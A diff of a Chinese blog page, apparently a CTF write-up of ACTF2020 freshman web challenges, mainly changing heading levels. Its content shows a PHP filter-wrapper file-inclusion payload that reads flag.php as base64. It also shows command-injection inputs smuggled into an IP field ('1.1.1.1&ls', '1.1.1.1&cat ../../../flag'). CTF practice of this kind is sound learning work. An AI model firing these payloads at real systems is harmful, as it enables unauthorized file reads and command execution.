@@ -457,7 +457,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    329
+                    330
                 </div>
                 
 
@@ -477,20 +477,20 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h1><p><strong>点击tips，发现url是文件包含，而且被包含的文件是flag.php</strong></p>
-<h2 id="利用php伪协议读取flag-php的源代码"><a href="#利用php伪协议读取flag-php的源代码" class="headerlink" title="利用php伪协议读取flag.php的源代码"></a>利用php伪协议读取flag.php的源代码</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span><span class="token argument-name">php</span><span class="token punctuation">:</span><span class="token comment">//filter/convert.base64-encode/resource=flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+                <h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p><strong>点击tips，发现url是文件包含，而且被包含的文件是flag.php</strong></p>
+<h3 id="1-利用php伪协议读取flag-php的源代码"><a href="#1-利用php伪协议读取flag-php的源代码" class="headerlink" title="1. 利用php伪协议读取flag.php的源代码"></a>1. 利用php伪协议读取flag.php的源代码</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span><span class="token argument-name">php</span><span class="token punctuation">:</span><span class="token comment">//filter/convert.base64-encode/resource=flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqp0puucquj313904bab6.jpg" alt="image-20210520172515014"></p>
 <p>将字符串进行base64解码</p>
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqp0rwvutmj30z407o753.jpg" alt="image-20210520172713497"></p>
 <p>得到flag</p>
-<h1 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h1><h2 id="1-简单的命令注入"><a href="#1-简单的命令注入" class="headerlink" title="1. 简单的命令注入"></a>1. 简单的命令注入</h2><pre class="line-numbers language-ls" data-language="ls"><code class="language-ls">1.1.1.1&amp;ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><h3 id="1-简单的命令注入"><a href="#1-简单的命令注入" class="headerlink" title="1. 简单的命令注入"></a>1. 简单的命令注入</h3><pre class="line-numbers language-ls" data-language="ls"><code class="language-ls">1.1.1.1&amp;ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><strong>看到有index.php</strong></p>
-<h2 id="2-尝试读取上级目录"><a href="#2-尝试读取上级目录" class="headerlink" title="2.尝试读取上级目录"></a>2.尝试读取上级目录</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">1.1</span>.1.1<span class="token operator">&amp;</span><span class="token function">ls</span> <span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="2-尝试读取上级目录"><a href="#2-尝试读取上级目录" class="headerlink" title="2.尝试读取上级目录"></a>2.尝试读取上级目录</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">1.1</span>.1.1<span class="token operator">&amp;</span><span class="token function">ls</span> <span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqp1h6ux5aj30pm0fkdgi.jpg" alt="image-20210520175128265"></p>
-<h2 id="读取flag"><a href="#读取flag" class="headerlink" title="读取flag"></a>读取flag</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">1.1</span>.1.1<span class="token operator">&amp;</span><span class="token function">cat</span> <span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="读取flag"><a href="#读取flag" class="headerlink" title="读取flag"></a>读取flag</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">1.1</span>.1.1<span class="token operator">&amp;</span><span class="token function">cat</span> <span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqp1iaxf28j30k2025glq.jpg" alt="image-20210520175235432"></p>
 <h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><h3 id="1-根据提示利用工具扫描网站目录"><a href="#1-根据提示利用工具扫描网站目录" class="headerlink" title="1. 根据提示利用工具扫描网站目录"></a>1. 根据提示利用工具扫描网站目录</h3><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqp1kldxnsj30ll038jrp.jpg" alt="image-20210520175446877"></p>
